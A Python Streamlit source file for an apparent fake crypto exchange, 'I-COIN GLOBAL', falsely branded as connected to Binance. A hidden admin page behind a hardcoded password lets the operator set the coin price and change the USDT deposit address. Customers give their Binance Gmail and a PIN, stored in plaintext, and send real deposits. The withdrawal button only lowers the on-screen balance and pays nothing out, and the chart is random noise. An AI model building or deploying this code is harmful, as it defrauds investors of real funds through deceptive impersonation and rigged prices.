import streamlit as st
import pandas as pd
import numpy as np
import plotly.graph_objects as go
import random
import time
import os
import sqlite3  # Asli Database Engine

# Sovereign Web3 Layer-1 Terminal Boot Setup
st.set_page_config(
    page_title="I Sovereign Quantum Network",
    page_icon="👑",
    layout="wide",
    initial_sidebar_state="expanded"
)

# --- 1. DATABASE & SERVER DIRECTORY SETUP ---
RECEIPTS_DIR = "all_customer_receipts"
if not os.path.exists(RECEIPTS_DIR):
    os.makedirs(RECEIPTS_DIR)

# SQLite Database Initialization
conn = sqlite3.connect("network.db", check_same_thread=False)
cursor = conn.cursor()

# Dynamic Tables Re-Creation & Version Management (Updated to check for 'pin' column)
try:
    cursor.execute("SELECT pin FROM users LIMIT 1")
except sqlite3.OperationalError:
    cursor.execute("DROP TABLE IF EXISTS users")
    cursor.execute("DROP TABLE IF EXISTS deposits")
    cursor.execute("DROP TABLE IF EXISTS trades")
    conn.commit()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    email TEXT UNIQUE, 
    balance REAL,
    pin TEXT
)""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS deposits (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    user_email TEXT, 
    txid TEXT, 
    amount REAL, 
    receipt_path TEXT, 
    status TEXT
)""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS trades (
    id INTEGER PRIMARY KEY AUTOINCREMENT, 
    user_email TEXT, 
    type TEXT, 
    margin REAL, 
    leverage INTEGER, 
    entry_price REAL, 
    status TEXT, 
    pnl REAL
)""")

# Settings table for Live Price & Wallet Address Manipulation
cursor.execute("""
CREATE TABLE IF NOT EXISTS settings (
    key TEXT UNIQUE,
    value TEXT
)""")
# Default Price & Default USDT Address Setup if not exists
cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('coin_price', '1.00000')")
cursor.execute("INSERT OR IGNORE INTO settings (key, value) VALUES ('usdt_address', 'TY2n79AxR8mP9sCq1kXo4MainnetVault')")
conn.commit()


# --- DATABASE HELPER FUNCTIONS ---
def get_or_create_user(email, pin_code=None):
    cursor.execute("SELECT balance FROM users WHERE email=?", (email,))
    row = cursor.fetchone()
    if row:
        return row[0]
    else:
        default_bal = 1250.00
        # If user doesn't exist, create with provided pin
        cursor.execute("INSERT INTO users (email, balance, pin) VALUES (?, ?, ?)", (email, default_bal, pin_code))
        conn.commit()
        return default_bal

def update_user_balance(email, amount):
    cursor.execute("UPDATE users SET balance = balance + ? WHERE email=?", (amount, email))
    conn.commit()

def get_db_price():
    cursor.execute("SELECT value FROM settings WHERE key='coin_price'")
    return float(cursor.fetchone()[0])

def update_db_price(new_price):
    cursor.execute("UPDATE settings SET value=? WHERE key='coin_price'", (str(new_price),))
    conn.commit()

def get_db_wallet():
    cursor.execute("SELECT value FROM settings WHERE key='usdt_address'")
    return cursor.fetchone()[0]

def update_db_wallet(new_address):
    cursor.execute("UPDATE settings SET value=? WHERE key='usdt_address'", (str(new_address).strip(),))
    conn.commit()


# --- ULTRA LUXURY CSS STYLING ENGINE ---
st.markdown("""
    <style>
    .stApp {
        background: radial-gradient(circle at 50% 10%, #060913 0%, #020408 70%, #000000 100%);
        color: #F1F5F9;
        font-family: 'JetBrains Mono', monospace;
    }
    
    .ledger-ribbon {
        width: 100%;
        background: rgba(4, 8, 16, 0.95);
        backdrop-filter: blur(12px);
        padding: 12px 0;
        border-bottom: 2px solid #FFD700;
        margin-bottom: 25px;
    }
    .ledger-stream {
        display: inline-block;
        white-space: nowrap;
        animation: marqueeLog 25s linear infinite;
        color: #94A3B8;
        font-size: 11px;
        letter-spacing: 1px;
    }
    @keyframes marqueeLog {
        0% { transform: translate3d(100%, 0, 0); }
        100% { transform: translate3d(-100%, 0, 0); }
    }
    .ledger-stream span { margin-right: 60px; }
    .neon-g { color: #14F195; font-weight: bold; text-shadow: 0 0 10px rgba(20,241,149,0.4); }
    .neon-p { color: #FFD700; font-weight: bold; text-shadow: 0 0 10px rgba(255,215,0,0.4); }

    .binance-badge-script {
        background: linear-gradient(90deg, rgba(243,186,47,0.15) 0%, rgba(0,0,0,0) 100%);
        border-left: 3px solid #F3BA2F;
        padding: 8px 15px;
        border-radius: 0 8px 8px 0;
        margin-top: -15px;
        margin-bottom: 25px;
        font-size: 12px;
        color: #F3BA2F;
    }

    /* 3D COIN ENGINE */
    .luxury-logo-box {
        display: flex;
        flex-direction: column;
        justify-content: center;
        align-items: center;
        margin: 30px 0 15px 0;
    }
    .coin-container {
        width: 140px;
        height: 140px;
        perspective: 1000px;
    }
    .real-3d-coin {
        width: 100%;
        height: 100%;
        position: relative;
        transform-style: preserve-3d;
        animation: spinCoin3D 7s linear infinite;
    }
    @keyframes spinCoin3D {
        0% { transform: rotateY(0deg); }
        100% { transform: rotateY(360deg); }
    }
    .coin-side {
        position: absolute;
        width: 100%;
        height: 100%;
        border-radius: 50%;
        backface-visibility: hidden;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .coin-front-side {
        background: radial-gradient(circle at 35% 35%, #FFD700 0%, #B8860B 60%, #8B6508 100%);
        border: 4px solid #FFE4B5;
        transform: translateZ(6px);
        box-shadow: 0 0 35px rgba(255, 215, 0, 0.5), inset 0 0 20px rgba(0, 0, 0, 0.6);
    }
    .coin-back-side {
        background: radial-gradient(circle at 35% 35%, #B8860B 0%, #8B6508 60%, #553C00 100%);
        border: 4px solid #B8860B;
        transform: rotateY(180deg) translateZ(6px);
        box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.6);
    }
    .real-3d-coin::before {
        content: "";
        position: absolute;
        width: 100%;
        height: 100%;
        border-radius: 50%;
        background: #8B6508;
        transform: translateZ(-6px);
    }
    .coin-inner-engraving {
        position: absolute;
        width: 114px;
        height: 114px;
        border: 3px dashed rgba(255, 255, 255, 0.4);
        border-radius: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
    }
    .coin-letter {
        font-size: 80px;
        font-weight: 900;
        color: #FFFFFF;
        text-shadow: 3px 3px 0px #8B6508, 0px 0px 15px rgba(255,255,255,0.5);
    }
    .crypto-slogan {
        text-align: center;
        font-size: 24px;
        font-weight: 900;
        letter-spacing: 5px;
        background: linear-gradient(90deg, #FFD700 0%, #FFFFFF 50%, #F3BA2F 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        margin-top: 20px;
        margin-bottom: 35px;
        text-transform: uppercase;
    }

    .stExpander p, .stExpander span, .stExpander label {
        color: #FFFFFF !important;
        font-size: 13px !important;
        font-weight: 600 !important;
    }
    .streamlit-expanderHeader {
        background-color: rgba(243, 186, 47, 0.08) !important;
        border: 1px solid rgba(243, 186, 47, 0.3) !important;
        border-radius: 8px !important;
    }
    .streamlit-expanderHeader p {
        color: #FFD700 !important;
        font-size: 16px !important;
        font-weight: bold !important;
    }

    .luxury-card {
        background: linear-gradient(145deg, rgba(13, 22, 43, 0.9) 0%, rgba(5, 10, 20, 0.95) 100%);
        border: 1px solid #1E293B;
        padding: 25px;
        border-radius: 16px;
        text-align: center;
        box-shadow: 0 8px 32px rgba(0,0,0,0.5);
    }
    .luxury-card-title { color: #94A3B8; font-size: 12px; text-transform: uppercase; letter-spacing: 1.5px; font-weight: bold; }
    .luxury-card-value { color: #FFFFFF; font-size: 30px; font-weight: 900; margin-top: 8px; letter-spacing: 0.5px; }
    
    /* NEON GREEN INDEX GLOW */
    .price-glow { 
        color: #14F195 !important; 
        text-shadow: 0 0 20px rgba(20,241,149,0.6), 0 0 40px rgba(20,241,149,0.2) !important;
        font-weight: 900;
    }
    
    /* COIN GOLD GLOW */
    .coin-glow {
        color: #FFD700 !important;
        text-shadow: 0 0 15px rgba(255,215,0,0.5) !important;
    }

    .stNumberInput input, .stTextInput input {
        background-color: #0B0F19 !important;
        color: #FFFFFF !important;
        border: 1px solid #334155 !important;
        border-radius: 6px !important;
    }

    div.stButton > button {
        color: #FFFFFF !important;
        font-weight: bold !important;
        border-radius: 8px !important;
        min-height: 48px !important;
    }
    .buy-btn-style button {
        background: linear-gradient(135deg, #10B981 0%, #059669 100%) !important;
        border: 1px solid #34D399 !important;
    }
    .sell-btn-style button {
        background: linear-gradient(135deg, #EF4444 0%, #DC2626 100%) !important;
        border: 1px solid #F87171 !important;
    }
    .action-btn button {
        background: linear-gradient(135deg, #F3BA2F 0%, #D49B13 100%) !important;
        border: 1px solid #FFD700 !important;
        color: #000000 !important;
    }
    
    .admin-table {
        width: 100%;
        border-collapse: collapse;
        margin: 20px 0;
        background-color: #0B0F19;
        color: white;
    }
    .admin-table th, .admin-table td {
        border: 1px solid #1E293B;
        padding: 12px;
        text-align: left;
    }
    .admin-table th { background-color: #151D30; color: #FFD700; }
    </style>
""", unsafe_allow_html=True)


# --- 2. HIGHLY SECURE HIDDEN ROUTING ENGINE ---
is_admin_route = st.query_params.get("view") == "admin"

if 'connected_gmail' not in st.session_state:
    st.session_state.connected_gmail = None

# Sidebar Configuration
if not is_admin_route:
    st.sidebar.markdown("<h2 style='color:#FFD700; text-align:center;'>👑 I-VAULT</h2>", unsafe_allow_html=True)
    st.sidebar.markdown("Welcome to the Sovereign Layer-1 decentralization cloud node framework.")
    if st.session_state.connected_gmail:
        st.sidebar.markdown("---")
        st.sidebar.markdown(f"👤 **Connected Binance ID:**<br><code style='color:#FFD700;'>{st.session_state.connected_gmail}</code>", unsafe_allow_html=True)
        if st.sidebar.button("🔌 Disconnect Vault", key="disconnect_btn"):
            st.session_state.connected_gmail = None
            st.rerun()


# ==============================================================================
#           🔥 VIEW 1: MASTER ADMIN DASHBOARD (COMPLETELY HIDDEN ROUTE) 🔥
# ==============================================================================
if is_admin_route:
    st.sidebar.markdown("<h2 style='color:#FFD700; text-align:center;'>🔐 SECURITY DESK</h2>", unsafe_allow_html=True)
    admin_password = st.sidebar.text_input("Master Authorization Key:", type="password")
    
    if admin_password != "admin123":
        st.title("🔒 SECURE SERVER GATEWAY")
        st.warning("This node routing path is encrypted. Please provide the node master password in the sidebar to sync logs.")
        if admin_password != "":
            st.error("❌ INVALID MASTER TERMINAL KEY")
    else:
        st.sidebar.success("👑 WELCOME BACK MIAN BILAL")
        st.title("👑 MIAN BILAL - QUANTUM ADMIN MASTER VAULT")
        st.markdown("Welcome to the isolated cloud server operations master engine.")
        st.markdown("---")
        
        # 🎛️ CONTROL DESK FOR PRICE & WALLET MUTATION
        st.subheader("🎛️ CORE NETWORK MANIPULATION DESK")
        current_market_base = get_db_price()
        current_wallet_base = get_db_wallet()
        
        col_p1, col_p2 = st.columns(2)
        with col_p1:
            st.markdown("##### 🪙 Price Settlement")
            new_price_input = st.number_input(
                "Set Target Market Price for I-COIN ($ USDT):", 
                min_value=0.0001, value=current_market_base, step=0.1, format="%.5f"
            )
            if st.button("🚀 FORCE UPDATE PRICE", use_container_width=True, key="update_price_btn"):
                update_db_price(new_price_input)
                st.success(f"Market shifted to ${new_price_input:.5f}!")
                time.sleep(1)
                st.rerun()
                
        with col_p2:
            st.markdown("##### 📥 Dynamic Deposit Wallet")
            new_wallet_input = st.text_input(
                "Set Master USDT (TRC20) Deposit Address:", 
                value=current_wallet_base
            )
            if st.button("💾 SAVE NEW WALLET ADDRESS", use_container_width=True, key="update_wallet_btn"):
                update_db_wallet(new_wallet_input)
                st.success("USDT Target Address Updated Globally!")
                time.sleep(1)
                st.rerun()
                
        st.markdown("---")
        
        # METRICS FOR ADMIN
        c1, c2, c3 = st.columns(3)
        cursor.execute("SELECT COUNT(*) FROM deposits WHERE status='PENDING'")
        pending_count = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM trades WHERE status='ACTIVE'")
        active_trades_count = cursor.fetchone()[0]
        
        cursor.execute("SELECT SUM(balance) FROM users")
        total_pool_raw = cursor.fetchone()[0]
        total_pool = total_pool_raw if total_pool_raw else 0.0
        
        with c1:
            st.metric("⏳ PENDING DEPOSITS", f"{pending_count} Requests")
        with c2:
            st.metric("📊 LIVE ACTIVE TRADES", f"{active_trades_count} Operations")
        with c3:
            st.metric("💰 TOTAL USER POOL BALANCE", f"${total_pool:,.2f} USDT")
            
        st.markdown("<br>", unsafe_allow_html=True)
        
        # SUB-SECTION 1: DEPOSIT APPROVAL DESK
        st.subheader("📥 INBOUND DEPOSIT VERIFICATION VAULT")
        cursor.execute("SELECT * FROM deposits WHERE status='PENDING'")
        pending_deposits = cursor.fetchall()
        
        if not pending_deposits:
            st.info("No pending client deposit receipts found.")
        else:
            for dep in pending_deposits:
                dep_id, user_email, txid, amount, img_path, status = dep
                with st.container():
                    st.markdown(f"<div style='background:#0B0F19; padding:15px; border-radius:8px; margin-bottom:15px; border-left: 5px solid #FFD700;'>", unsafe_allow_html=True)
                    col_info, col_img, col_actions = st.columns([2, 2, 1])
                    
                    with col_info:
                        st.markdown(f"<b>Request ID:</b> {dep_id}", unsafe_allow_html=True)
                        st.markdown(f"<b>Customer Binance Gmail:</b> <span style='color:#FFD700; font-weight:bold;'>{user_email}</span>", unsafe_allow_html=True)
                        st.markdown(f"<b>TxID Hash:</b> <code style='color:#14F195;'>{txid}</code>", unsafe_allow_html=True)
                        st.markdown(f"<b>Requested Amount:</b> <span style='font-size:18px; color:white; font-weight:bold;'>${amount:.2f} USDT</span>", unsafe_allow_html=True)
                    
                    with col_img:
                        if os.path.exists(img_path):
                            st.image(img_path, width=200, caption="Uploaded Invoice Screenshot")
                        else:
                            st.error("Image file not found on server storage.")
                            
                    with col_actions:
                        st.markdown("<br>", unsafe_allow_html=True)
                        if st.button("🟩 APPROVE", key=f"app_{dep_id}", use_container_width=True):
                            update_user_balance(user_email, amount)
                            cursor.execute("UPDATE deposits SET status='APPROVED' WHERE id=?", (dep_id,))
                            conn.commit()
                            st.success(f"Approved to {user_email}!")
                            time.sleep(1)
                            st.rerun()
                            
                        if st.button("🟥 REJECT", key=f"rej_{dep_id}", use_container_width=True):
                            cursor.execute("UPDATE deposits SET status='REJECTED' WHERE id=?", (dep_id,))
                            conn.commit()
                            st.error(f"Rejected request {dep_id}")
                            time.sleep(1)
                            st.rerun()
                    st.markdown("</div>", unsafe_allow_html=True)

        st.markdown("---")
        
        # SUB-SECTION 2: LIVE CUSTOMER TRADES TRACKING ROOM
        st.subheader("🕵️ LIVE CUSTOMER OPERATIONS ROOM (REAL-TIME RISK MONITOR)")
        cursor.execute("SELECT * FROM trades WHERE status='ACTIVE'")
        active_trades = cursor.fetchall()
        
        if not active_trades:
            st.info("No customer is currently trading right now. System idle.")
        else:
            html_table = "<table class='admin-table'><tr><th>Trade ID</th><th>Customer Binance Gmail</th><th>Action / Side</th><th>Margin Amount</th><th>Leverage</th><th>Entry Price</th><th>Status</th></tr>"
            for trade in active_trades:
                t_id, u_email, t_type, margin, leverage, entry, status, pnl = trade
                color = "#14F195" if t_type == "LONG" else "#EF4444"
                html_table += f"<tr><td>{t_id}</td><td style='color:#FFD700; font-weight:bold;'>{u_email}</td><td style='color:{color}; font-weight:bold;'>{t_type}</td><td>${margin:.2f} USDT</td><td>{leverage}x</td><td>${entry:.5f}</td><td><span style='background:#10B981; padding:2px 6px; border-radius:4px;'>LIVE</span></td></tr>"
            html_table += "</table>"
            st.markdown(html_table, unsafe_allow_html=True)


# ==============================================================================
#            🔥 VIEW 2: ORIGINAL CUSTOMER TERMINAL (100% PURE LOGGED) 🔥
# ==============================================================================
else:
    if st.session_state.connected_gmail is None:
        # Gateway Front Page with Premium 3D Rotating Coin Inside
        st.markdown("<br><br>", unsafe_allow_html=True)
        col_bl1, col_bl2, col_bl3 = st.columns([1, 1.6, 1])
        with col_bl2:
            st.markdown("""
                <div class="luxury-logo-box" style="margin-top: 0px; margin-bottom: 20px;">
                    <div class="coin-container">
                        <div class="real-3d-coin">
                            <div class="coin-side coin-front-side">
                                <div class="coin-inner-engraving">
                                    <div class="coin-letter">I</div>
                                </div>
                            </div>
                            <div class="coin-side coin-back-side">
                                <div class="coin-inner-engraving">
                                    <div class="coin-letter" style="transform: scaleX(-1);">I</div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
                <h3 style='text-align: center; color: #FFD700; font-weight: 800; letter-spacing: 3px; margin-top: 5px; margin-bottom: 35px; font-family: sans-serif;'>I-COIN GLOBAL</h3>
            """, unsafe_allow_html=True)
            
            input_gmail = st.text_input(
                "Enter Your Binance Registered Gmail / Account ID:", 
                placeholder="example@gmail.com", 
                key="binance_gmail_input_gate"
            )
            
            # PASWORD / PIN INPUT FIELD (Sufyan Bhai Ka Nya Secure Feature)
            input_pin = st.text_input(
                "Enter Secure 4-6 Digit Account PIN / Password:", 
                placeholder="••••", 
                type="password",
                max_chars=6,
                key="binance_pin_input_gate"
            )
            
            st.markdown('<div class="action-btn" style="margin-top:15px;">', unsafe_allow_html=True)
            if st.button("🔗 CONNECT SECURE IDENTITY GATEWAY", use_container_width=True, key="connect_bridge_submit"):
                email_clean = input_gmail.strip()
                pin_clean = input_pin.strip()
                
                if "@" in email_clean and "." in email_clean:
                    if len(pin_clean) >= 4 and len(pin_clean) <= 6 and pin_clean.isdigit():
                        
                        # Check if user already exists in SQLite Database
                        cursor.execute("SELECT pin FROM users WHERE email=?", (email_clean,))
                        user_db_row = cursor.fetchone()
                        
                        if user_db_row:
                            # User exists, verify the secret PIN
                            if user_db_row[0] == pin_clean:
                                st.session_state.connected_gmail = email_clean
                                st.success("⚡ Secure Gateway Unlocked! Loading Node...")
                                time.sleep(1)
                                st.rerun()
                            else:
                                st.error("❌ INVALID PIN! Please enter the correct password for this account.")
                        else:
                            # Auto-Register New User with their chosen PIN instantly
                            get_or_create_user(email_clean, pin_clean)
                            st.session_state.connected_gmail = email_clean
                            st.success("🎉 Welcome! New Identity Securely Initialized with ${1250:.2f} USDT Starting Balance.")
                            time.sleep(1.5)
                            st.rerun()
                    else:
                        st.error("⚠️ PIN must be a 4 to 6 digit numeric code.")
                else:
                    st.error("⚠️ Please enter a valid registered Gmail address format.")
            st.markdown('</div>', unsafe_allow_html=True)
            
    else:
        # Customer Main Terminal Layout
        st.markdown("""
            <div class="ledger-ribbon">
                <div class="ledger-stream">
                    <span>⚡ <b>LAYER-1 QUANTUM NODE:</b> VERIFIED ACTIVE</span>
                    <span>TOKEN INDEX: <span class="neon-p">I-COIN SOVEREIGN (HIGH DEPTH)</span></span>
                    <span>ROUTING INTERFACES: <span class="neon-g">BINANCE CLOUD CONNECTED</span></span>
                    <span>SECURE ACCOUNT SECURITY: <span class="neon-g">ENCRYPTED MEMORY PERSISTENCE</span></span>
                </div>
            </div>
        """, unsafe_allow_html=True)

        st.markdown(f"""
            <div class="binance-badge-script">
                <b>🤖 BINANCE IDENTITY BRIDGE ACTIVE:</b> Connected via Account ID: <u>{st.session_state.connected_gmail}</u> (All internal trade orders route through matching security logs)
            </div>
        """, unsafe_allow_html=True)

        # 3D Metallic Gold Coin Animation (Main Page)
        st.markdown("""
            <div class="luxury-logo-box">
                <div class="coin-container">
                    <div class="real-3d-coin">
                        <div class="coin-side coin-front-side">
                            <div class="coin-inner-engraving">
                                <div class="coin-letter">I</div>
                            </div>
                        </div>
                        <div class="coin-side coin-back-side">
                            <div class="coin-inner-engraving">
                                <div class="coin-letter" style="transform: scaleX(-1);">I</div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        """, unsafe_allow_html=True)

        st.markdown('<div class="crypto-slogan">I-TOKEN: THE FUTURE OF SOVEREIGN WEALTH</div>', unsafe_allow_html=True)

        if 'deposit_success' not in st.session_state:
            st.session_state.deposit_success = False
        if 'invoice_bytes' not in st.session_state:
            st.session_state.invoice_bytes = None

        current_db_balance = get_or_create_user(st.session_state.connected_gmail)

        # FETCH PRICE DYNAMICALLY FROM ADMIN CONTROLLER DATABASE
        admin_base_price = get_db_price()
        
        # Micro fluctuations around Admin's base price to keep chart alive
        tick = random.uniform(-0.0005, 0.0005)
        st.session_state.coin_price = admin_base_price + tick

        if 'price_history' not in st.session_state:
            base = st.session_state.coin_price
            history = []
            for i in range(25):
                open_p = base + random.uniform(-0.002, 0.002)
                close_p = open_p + random.uniform(-0.002, 0.002)
                history.append({'Open': open_p, 'High': max(open_p, close_p)+0.001, 'Low': min(open_p, close_p)-0.001, 'Close': close_p})
                base = close_p
            st.session_state.price_history = history

        current_candle = st.session_state.price_history[-1].copy()
        current_candle['Close'] = st.session_state.coin_price
        st.session_state.price_history[-1] = current_candle

        cursor.execute("SELECT * FROM trades WHERE user_email=? AND status='ACTIVE' LIMIT 1", (st.session_state.connected_gmail,))
        db_active_trade = cursor.fetchone()

        # DYNAMIC I-COIN BALANCING ENGINE (Calculates exact coins based on current price)
        total_icoins_owned = current_db_balance / st.session_state.coin_price

        # METRICS ENGINE WITH LUXURY HIGH-PRECISION NEON AND CENT TRACKER
        col_m1, col_m2, col_m3 = st.columns(3)

        with col_m1:
            # NEON GREEN GLOW LIVE PRICE INDEX
            st.markdown(f'<div class="luxury-card" style="border-bottom: 4px solid #14F195;"><div class="luxury-card-title">🚨 I-COIN LIVE INDEX</div><div class="luxury-card-value price-glow">${st.session_state.coin_price:.5f} <span style="font-size:14px;color:#94A3B8;">USDT</span></div></div>', unsafe_allow_html=True)

        with col_m2:
            # TOTAL COIN HOLDINGS MAPPER (Shows how many coins user owns precisely down to micro cents)
            st.markdown(f'<div class="luxury-card" style="border-bottom: 4px solid #FFD700;"><div class="luxury-card-title">🪙 TOTAL I-COIN HOLDINGS</div><div class="luxury-card-value coin-glow">{total_icoins_owned:.5f} <span style="font-size:14px;color:#94A3B8;">I-COIN</span></div></div>', unsafe_allow_html=True)

        with col_m3:
            # USDT LIQUIDITY TRACKER
            st.markdown(f'<div class="luxury-card" style="border-bottom: 4px solid #F3BA2F;"><div class="luxury-card-title">📥 RELEASED LIQUIDITY (USDT)</div><div class="luxury-card-value">${current_db_balance:,.2f}</div></div>', unsafe_allow_html=True)

        st.markdown("<br><br>", unsafe_allow_html=True)

        # --- ACTION AREAS ---
        
        # DESK 1: QUANTUM CHART AND FUTURES TRADING
        with st.expander("TRADE TERMINAL CONTROL", expanded=True):
            st.markdown("<br>", unsafe_allow_html=True)
            col_chart_engine, col_execution_desk = st.columns([2, 1])
            
            with col_chart_engine:
                st.markdown("<p style='color:#FFD700; font-weight:bold; margin-bottom:10px;'>📊 REAL-TIME HIGH FREQUENCY CANDLE VECTOR</p>", unsafe_allow_html=True)
                df_candles = pd.DataFrame(st.session_state.price_history)
                fig = go.Figure(data=[go.Candlestick(
                    x=list(range(len(df_candles))),
                    open=df_candles['Open'], high=df_candles['High'], low=df_candles['Low'], close=df_candles['Close'],
                    increasing_line_color='#14F195', decreasing_line_color='#EF4444',
                    increasing_fillcolor='#14F195', decreasing_fillcolor='#EF4444'
                )])
                fig.update_layout(
                    paper_bgcolor='rgba(0,0,0,0)', plot_bgcolor='rgba(10, 16, 30, 0.6)',
                    margin=dict(l=10, r=10, t=10, b=10), height=300,
                    xaxis=dict(showgrid=True, gridcolor='#1E293B', showticklabels=False),
                    yaxis=dict(showgrid=True, gridcolor='#1E293B', side='right', tickformat=".5f"),
                    showlegend=False, xaxis_rangeslider_visible=False
                )
                st.plotly_chart(fig, use_container_width=True, config={'displayModeBar': False})
                
            with col_execution_desk:
                st.markdown("<p style='color:#F3BA2F; font-weight:bold; margin-bottom:5px;'>🎛️ BINANCE ALLOCATED RISK INTERFACE</p>", unsafe_allow_html=True)
                margin_size = st.number_input("Position Margin (USDT):", min_value=10.0, max_value=float(current_db_balance if current_db_balance >= 10.0 else 10.0), value=100.0, step=50.0)
                leverage_multiplier = st.slider("Leverage Ratio Scale:", 1, 50, 20, step=5)
                st.markdown("<br>", unsafe_allow_html=True)
                
                if not db_active_trade:
                    col_l, col_s = st.columns(2)
                    with col_l:
                        st.markdown('<div class="buy-btn-style">', unsafe_allow_html=True)
                        if st.button("🟩 BUY / LONG", use_container_width=True, key="action_buy_long_btn"):
                            if current_db_balance >= margin_size:
                                update_user_balance(st.session_state.connected_gmail, -margin_size)
                                cursor.execute("INSERT INTO trades (user_email, type, margin, leverage, entry_price, status, pnl) VALUES (?, 'LONG', ?, ?, ?, 'ACTIVE', 0.0)", 
                                               (st.session_state.connected_gmail, margin_size, leverage_multiplier, st.session_state.coin_price))
                                conn.commit()
                                st.rerun()
                        st.markdown('</div>', unsafe_allow_html=True)
                    with col_s:
                        st.markdown('<div class="sell-btn-style">', unsafe_allow_html=True)
                        if st.button("🟥 SELL / SHORT", use_container_width=True, key="action_sell_short_btn"):
                            if current_db_balance >= margin_size:
                                update_user_balance(st.session_state.connected_gmail, -margin_size)
                                cursor.execute("INSERT INTO trades (user_email, type, margin, leverage, entry_price, status, pnl) VALUES (?, 'SHORT', ?, ?, ?, 'ACTIVE', 0.0)", 
                                               (st.session_state.connected_gmail, margin_size, leverage_multiplier, st.session_state.coin_price))
                                conn.commit()
                                st.rerun()
                        st.markdown('</div>', unsafe_allow_html=True)
                else:
                    t_id, _, t_type, margin, leverage, entry, status, pnl = db_active_trade
                    st.markdown(f"<p style='color:#FFD700; font-weight:bold;'>🚀 OPEN POSITION: {t_type} @ ${entry:.5f}</p>", unsafe_allow_html=True)
                    st.markdown('<div class="sell-btn-style">', unsafe_allow_html=True)
                    if st.button("🔏 CLOSE CONTRACT POSITION", use_container_width=True, key="action_close_position_btn"):
                        delta = (st.session_state.coin_price - entry) / entry
                        if t_type == "SHORT": delta = -delta
                        final_settlement_pnl = delta * margin * leverage
                        
                        total_refund = margin + final_settlement_pnl
                        update_user_balance(st.session_state.connected_gmail, total_refund)
                        
                        cursor.execute("UPDATE trades SET status='CLOSED', pnl=? WHERE id=?", (final_settlement_pnl, t_id))
                        conn.commit()
                        st.rerun()
                    st.markdown('</div>', unsafe_allow_html=True)

        # DESK 2: SECURE FLOW INBOUND / OUTBOUND WALLET (FETCHES WALLET LIVE FROM DB)
        with st.expander("FINANCIAL LEDGER ASSETS (WALLET)", expanded=False):
            st.markdown("<br>", unsafe_allow_html=True)
            col_dep, col_wd = st.columns(2)
            
            with col_dep:
                st.markdown("<p style='color:#14F195; font-weight:bold;'>📥 CRYPTO DEPOSIT VAULT</p>", unsafe_allow_html=True)
                
                live_usdt_wallet = get_db_wallet()
                st.markdown(f"<div style='background:rgba(4,8,16,0.8); border:1px dashed #FFD700; padding:15px; border-radius:8px; font-size:13px; text-align:center; margin-bottom:15px;'>Official Master USDT Address:<br><code style='color:#FFD700; font-weight:bold; font-size:14px;'>{live_usdt_wallet}</code></div>", unsafe_allow_html=True)
                
                deposit_input_val = st.number_input("Amount Allocation (USDT):", min_value=10.0, value=10.0, step=10.0)
                transaction_hash_ref = st.text_input("Network TxID Signature Authentication Link:", placeholder="Paste verification hash link here...", key="tx_hash_v4")
                
                st.markdown("<p style='color:#FFFFFF; font-size:13px; font-weight:bold; margin-top:10px;'>📸 Upload Network Invoice Screenshot:</p>", unsafe_allow_html=True)
                uploaded_invoice = st.file_uploader("Choose Invoice Image...", type=["png", "jpg", "jpeg"], key="invoice_file_uploader", label_visibility="collapsed")
                
                if uploaded_invoice is not None:
                    st.session_state.invoice_bytes = uploaded_invoice.getvalue()

                st.markdown('<div class="action-btn" style="margin-top:15px;">', unsafe_allow_html=True)
                if st.button("PROCEED VERIFIED INBOUND FLOW", use_container_width=True, key="deposit_submit_btn"):
                    if transaction_hash_ref.strip() != "" and uploaded_invoice is not None:
                        
                        clean_txid = "".join([c for c in transaction_hash_ref if c.isalnum()])[:15]
                        file_name = f"TxID_{clean_txid}_{uploaded_invoice.name}"
                        full_save_path = os.path.join(RECEIPTS_DIR, file_name)
                        
                        with open(full_save_path, "wb") as f:
                            f.write(st.session_state.invoice_bytes)
                        
                        cursor.execute("INSERT INTO deposits (user_email, txid, amount, receipt_path, status) VALUES (?, ?, ?, ?, 'PENDING')",
                                       (st.session_state.connected_gmail, transaction_hash_ref, deposit_input_val, full_save_path))
                        conn.commit()
                        
                        st.session_state.deposit_success = True
                        st.info("⏳ Receipt saved! Transmitted safely to Admin Master Server.")
                        time.sleep(2)
                        st.rerun()
                    elif uploaded_invoice is None:
                        st.error("⚠️ Please upload your transaction invoice screenshot first!")
                    elif transaction_hash_ref.strip() == "":
                        st.error("⚠️ Please paste your transaction TxID link!")
                st.markdown('</div>', unsafe_allow_html=True)
                
                if st.session_state.deposit_success and st.session_state.invoice_bytes is not None:
                    st.markdown("<br><p style='color:#FFD700; font-weight:bold; font-size:12px;'>✅ TRANSMITTED PROOF OF INVOICE:</p>", unsafe_allow_html=True)
                    st.image(st.session_state.invoice_bytes, width=220)
                        
            with col_wd:
                st.markdown("<p style='color:#EF4444; font-weight:bold;'>🟥 CRYPTO FLOW OUTBOUND (WITHDRAW)</p>", unsafe_allow_html=True)
                withdraw_input_val = st.number_input("Liquidation Release Amount (USDT):", min_value=10.0, value=100.0, step=50.0)
                destination_wallet_hash = st.text_input("Target Wallet Address Hash Only:", placeholder="Must be valid TRC20 network address...")
                
                st.markdown('<div class="sell-btn-style">', unsafe_allow_html=True)
                if st.button("DISPATCH SYSTEM OUTBOUND FLOW", use_container_width=True, key="withdraw_execute_btn"):
                    if destination_wallet_hash.strip() != "" and current_db_balance >= withdraw_input_val:
                        update_user_balance(st.session_state.connected_gmail, -withdraw_input_val)
                        st.success(f"Withdrawal request of ${withdraw_input_val} dispatched successfully!")
                        time.sleep(1)
                        st.rerun()
                st.markdown('</div>', unsafe_allow_html=True)

        # Refresh loop control to keep price ticker real-time (Only runs when logged in)
        time.sleep(2.5)
        st.rerun()